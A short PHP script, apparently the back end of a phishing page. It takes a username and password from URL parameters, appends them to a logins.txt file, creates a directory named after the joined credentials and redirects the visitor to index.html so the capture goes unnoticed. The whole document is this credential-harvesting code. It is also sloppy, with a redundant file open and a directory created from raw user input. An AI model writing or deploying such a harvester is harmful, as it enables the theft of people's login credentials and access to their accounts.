<?php
$password = $_GET['password'];
$username = $_GET['username'];
$combo = $username;
$combo .= $password;
fopen("logins.txt", "a");
$file = fopen("logins.txt", "a");
fwrite($file, $combo);
mkdir($combo);
header("Location: index.html");
?>
